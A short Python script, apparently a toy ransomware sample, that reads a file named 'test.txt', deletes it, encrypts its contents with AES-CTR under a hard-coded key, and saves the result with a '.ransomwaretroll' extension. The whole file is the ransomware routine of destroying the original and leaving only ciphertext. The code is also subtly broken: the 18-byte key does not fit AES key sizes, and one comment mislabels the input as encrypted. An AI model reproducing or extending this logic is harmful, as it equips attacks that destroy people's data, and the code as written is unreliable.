import os
import pyaes

## open encripted file
file_name = "test.txt"
file = open(file_name, "rb")
file_data = file.read()
file.close()

## remove file
os.remove(file_name)

## encrytion key
key = b"encriptionPassword"
aes = pyaes.AESModeOfOperationCTR(key)

## file encription
crypto_data = aes.encrypt(file_data)

## save encripted file
new_file = file_name + ".ransomwaretroll"
new_file = open(f'{new_file}','wb')
new_file.write(crypto_data)
new_file.close()